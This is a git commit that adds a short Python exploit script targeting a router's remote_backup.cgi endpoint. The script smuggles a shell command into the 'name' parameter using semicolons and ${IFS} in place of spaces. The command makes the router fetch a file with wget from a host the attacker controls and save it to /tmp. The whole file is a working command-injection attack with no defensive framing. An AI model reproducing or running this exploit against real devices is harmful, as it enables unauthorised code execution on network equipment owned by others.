af10c74bb42a9e41f10d5476fdd8d185659fe602
longqx223 <19014781467@163.com>
2026-03-17 10:56:00 +0800

    Add files via upload

---
+++ remote_backup.cgi-cgi_backup_now.py
@@ -0,0 +1,26 @@
+import requests
+
+ROUTER_IP = "192.168.31.10"
+MY_IP = "192.168.31.215"
+MY_PORT = "8000"
+FILE_NAME = "hack.txt"
+
+def run_exploit():
+    target_url = f"http://{ROUTER_IP}:80/cgi-bin/remote_backup.cgi"
+    
+    wget_cmd = f"wget${{IFS}}http://{MY_IP}:{MY_PORT}/{FILE_NAME}${{IFS}}-O${{IFS}}/tmp/{FILE_NAME}"
+    final_payload = f"1;{wget_cmd};#"
+    
+    params = {
+        'cmd': 'cgi_backup_now',
+        'name': final_payload,
+    }
+    
+    try:
+        requests.get(target_url, params=params, timeout=5)
+        print("[+] Exploit sent successfully!")
+    except Exception:
+        print("[+] Exploit sent (check server logs)!")
+
+if __name__ == "__main__":
+    run_exploit()
